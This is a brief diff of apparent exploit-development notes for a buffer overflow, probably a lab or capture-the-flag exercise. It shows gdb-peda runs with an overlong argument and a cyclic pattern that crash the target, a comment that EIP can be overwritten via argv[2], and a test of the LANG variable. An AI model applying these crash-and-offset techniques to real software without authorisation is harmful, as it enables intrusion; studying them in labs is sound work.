@@ -36,7 +36,7 @@ Stopped reason: SIGSEGV
 # we can overwrite now EIP with our argv[2]
 
 # now let's look at the environnement virable lang to see if it has an influence
-# LANG = 'fil'
+# LANG = "fi"
 export LANG="fi"
 gdb-peda$ r $(python -c 'print "A"*100') 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 Stopped reason: SIGSEGV
